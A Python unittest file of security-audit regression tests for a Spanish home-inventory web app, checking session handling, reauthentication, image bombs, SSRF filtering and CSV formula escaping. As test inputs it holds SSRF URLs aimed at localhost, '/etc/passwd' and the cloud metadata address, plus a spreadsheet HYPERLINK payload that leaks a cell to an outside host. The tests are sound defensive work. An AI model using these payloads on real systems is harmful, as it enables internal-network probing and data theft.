"""Regresiones de la auditoria de seguridad (cada test reproduce un fallo real)."""
import io
import unittest
import uuid

from PIL import Image
from werkzeug.security import generate_password_hash

from stockhogar import create_app
from stockhogar.db import ahora, get_db
from stockhogar.servicios.push_service import endpoint_push_permitido
from stockhogar.utils.csv_seguro import desproteger, proteger
from stockhogar.utils.imagenes import imagen_demasiado_grande, validar_y_recodificar

PASSWORD = "Contrasena-Segura-9271"


class Base(unittest.TestCase):
    def setUp(self):
        self.app = create_app()
        self.app.config.update(TESTING=True, WTF_CSRF_ENABLED=False)
        self.ids = []
        self.hogares = []

    def tearDown(self):
        with self.app.app_context():
            db = get_db()
            for h in self.hogares:
                db.execute("DELETE FROM hogares WHERE id=?", (h,))
            for u in self.ids:
                db.execute("DELETE FROM usuarios WHERE id=?", (u,))
            db.commit()

    def usuario(self, hogar=True, password=PASSWORD):
        nombre = "aud_" + uuid.uuid4().hex[:8]
        with self.app.app_context():
            db = get_db()
            uid = db.execute("INSERT INTO usuarios (nombre_usuario,password_hash,fecha_creacion) VALUES (?,?,?)",
                             (nombre, generate_password_hash(password), ahora())).lastrowid
            hid = None
            if hogar:
                hid = db.execute(
                    "INSERT INTO hogares (nombre,usuario_propietario_id,privada,fecha_creacion,fecha_actualizacion) VALUES (?,?,1,?,?)",
                    ("H", uid, ahora(), ahora())).lastrowid
                self.hogares.append(hid)
            db.commit()
        self.ids.append(uid)
        c = self.app.test_client()
        with c.session_transaction() as s:
            s["usuario"] = nombre
            s["usuario_id"] = uid
            if hid:
                s["hogar_actual_id"] = hid
        return c, uid, hid, nombre


class RegistroTests(Base):
    def test_registrar_usuario_existente_no_abre_sesion(self):
        _, uid, _, nombre = self.usuario()
        c = self.app.test_client()
        r = c.post("/api/auth/registrar", json={"usuario": nombre.upper(), "password": "OtraContrasena-4455x", "acepta_terminos": True})
        self.assertEqual(r.status_code, 409)
        self.assertEqual(c.get("/api/productos").status_code, 401)


class SesionTests(Base):
    def test_logout_invalida_la_cookie_copiada(self):
        c, _, _, nombre = self.usuario()
        self.assertEqual(c.get("/api/productos").status_code, 200)  # asigna el id de sesion
        copia = c.get_cookie("session").value
        self.assertEqual(c.post("/api/auth/logout").status_code, 200)
        ladron = self.app.test_client()
        ladron.set_cookie("session", copia)
        self.assertEqual(ladron.get("/api/productos").status_code, 401)

    def test_sesion_de_30_dias(self):
        self.assertEqual(self.app.config["PERMANENT_SESSION_LIFETIME"].days, 30)


class ReautenticacionTests(Base):
    def test_borrar_cuenta_exige_contrasena(self):
        c, uid, _, _ = self.usuario(hogar=False)
        otro, _, _, _ = self.usuario(hogar=False)  # evita el "ultimo usuario"
        r = c.delete(f"/api/usuarios/{uid}", json={})
        self.assertEqual(r.status_code, 400)
        r = c.delete(f"/api/usuarios/{uid}", json={"password_actual": "mala-mala-mala"})
        self.assertEqual(r.status_code, 400)
        r = c.delete(f"/api/usuarios/{uid}", json={"password_actual": PASSWORD})
        self.assertEqual(r.status_code, 200)

    def test_desactivar_2fa_exige_contrasena(self):
        c, uid, _, _ = self.usuario(hogar=False)
        self.assertEqual(c.post("/api/auth/doble-factor", json={"activo": False}).status_code, 400)
        self.assertEqual(c.post("/api/auth/doble-factor", json={"activo": False, "password_actual": PASSWORD}).status_code, 200)


class ImagenesTests(unittest.TestCase):
    def test_bomba_de_pixeles_se_rechaza_sin_decodificar(self):
        buf = io.BytesIO()
        Image.new("1", (9000, 9000)).save(buf, "PNG")  # 81 Mpx, pocos KB
        self.assertTrue(imagen_demasiado_grande(buf.getvalue()))
        datos, error = validar_y_recodificar(buf.getvalue(), "png")
        self.assertIsNone(datos)
        self.assertEqual(error, "err_formato_no_permitido")

    def test_foto_normal_pasa(self):
        buf = io.BytesIO()
        Image.new("RGB", (800, 600)).save(buf, "PNG")
        self.assertFalse(imagen_demasiado_grande(buf.getvalue()))
        self.assertIsNotNone(validar_y_recodificar(buf.getvalue(), "png")[0])


class PushSsrfTests(Base):
    def test_endpoints(self):
        for malo in ("http://127.0.0.1:8080/x", "https://127.0.0.1/x", "file:///etc/passwd", "https://fcm.googleapis.com.evil.com/x",
                     "https://user@fcm.googleapis.com/x", "https://fcm.googleapis.com:8443/x", "https://169.254.169.254/"):
            self.assertFalse(endpoint_push_permitido(malo), malo)
        for bueno in ("https://fcm.googleapis.com/fcm/send/abc", "https://updates.push.services.mozilla.com/wpush/v2/x",
                      "https://web.push.apple.com/x", "https://wns2-par02p.notify.windows.com/w"):
            self.assertTrue(endpoint_push_permitido(bueno), bueno)

    def test_la_ruta_rechaza_endpoint_interno(self):
        c, *_ = self.usuario()
        r = c.post("/api/push/suscribir", json={"endpoint": "http://127.0.0.1:9999/interno", "keys": {"p256dh": "a", "auth": "b"}})
        self.assertEqual(r.status_code, 400)


class CsvTests(unittest.TestCase):
    def test_formulas_se_neutralizan_y_los_numeros_no(self):
        self.assertEqual(proteger('=HYPERLINK("x")'), "'=HYPERLINK(\"x\")")
        self.assertEqual(proteger("@SUM(A1)"), "'@SUM(A1)")
        self.assertEqual(proteger("-5,00"), "-5,00")
        self.assertEqual(proteger("Leche"), "Leche")
        self.assertEqual(desproteger(proteger("=x")), "=x")

    def test_exportacion_de_productos(self):
        t = ParticularCsv()
        t.run(self)


class ParticularCsv:
    def run(self, caso):
        base = Base("setUp")
        base.setUp()
        try:
            c, uid, hid, _ = base.usuario()
            r = c.post("/api/productos", json={"nombre": '=HYPERLINK("http://x/?"&A1,"clic")', "cantidad": 1, "categoria": "Otros"})
            caso.assertIn(r.status_code, (200, 201), r.get_data(as_text=True))
            texto = c.get("/api/productos/exportar").get_data(as_text=True)
            caso.assertNotIn("\n=HYPERLINK", texto)
            caso.assertIn("'=HYPERLINK", texto)
        finally:
            base.tearDown()


class CatalogoPorHogarTests(Base):
    def test_lo_aprendido_por_un_hogar_no_lo_ve_otro(self):
        a, _, ha, _ = self.usuario()
        b, _, hb, _ = self.usuario()
        nombre = "Secreto " + uuid.uuid4().hex[:6]
        r = a.post("/api/productos", json={"nombre": nombre, "cantidad": 1, "categoria": "Otros", "icono": "h-folder"})
        self.assertIn(r.status_code, (200, 201), r.get_data(as_text=True))
        nombres_a = [x["nombre"] for x in a.get("/api/historial").get_json()]
        nombres_b = [x["nombre"] for x in b.get("/api/historial").get_json()]
        self.assertIn(nombre, nombres_a)
        self.assertNotIn(nombre, nombres_b)
        with self.app.app_context():
            get_db().execute("DELETE FROM historial_articulos WHERE nombre=?", (nombre,))
            get_db().commit()

    def test_no_se_puede_pisar_el_catalogo_estandar(self):
        a, *_ = self.usuario()
        b, *_ = self.usuario()
        with self.app.app_context():
            fila = get_db().execute("SELECT nombre, icono FROM historial_articulos WHERE hogar_id = 0 LIMIT 1").fetchone()
        a.post("/api/productos", json={"nombre": fila["nombre"], "cantidad": 1, "categoria": "Otros", "icono": "POISON"})
        iconos_b = {x["nombre"]: x["icono"] for x in b.get("/api/historial").get_json()}
        self.assertEqual(iconos_b[fila["nombre"]], fila["icono"])


class CategoriasPermisoTests(Base):
    def test_sin_hogar_no_crea_ni_borra_categorias_de_gasto(self):
        c, *_ = self.usuario(hogar=False)
        self.assertEqual(c.post("/api/categorias-gasto", json={"nombre": "X" + uuid.uuid4().hex[:5]}).status_code, 403)
        self.assertEqual(c.delete("/api/categorias-gasto/1").status_code, 403)

    def test_las_categorias_de_serie_no_se_borran(self):
        c, *_ = self.usuario()
        with self.app.app_context():
            fila = get_db().execute("SELECT id FROM categorias_gasto WHERE nombre='Transporte'").fetchone()
        self.assertEqual(c.delete(f"/api/categorias-gasto/{fila['id']}").status_code, 400)


class RecurrentesTests(Base):
    def test_fecha_de_inicio_muy_antigua_se_rechaza(self):
        c, uid, *_ = self.usuario()
        r = c.post("/api/gastos/recurrentes", json={
            "descripcion": "A", "importe_total": 5, "frecuencia": "semanal", "fecha_inicio": "1000-01-01",
            "usuario_pagador_id": uid, "participantes": [{"usuario_id": uid, "importe": 5}]})
        self.assertEqual(r.status_code, 400, r.get_data(as_text=True))


class OauthTests(unittest.TestCase):
    def test_no_se_vincula_por_email_no_verificado(self):
        import inspect
        from stockhogar.rutas import oauth
        fuente = inspect.getsource(oauth)
        self.assertIn("email_verificado = 1", fuente)


if __name__ == "__main__":
    unittest.main()
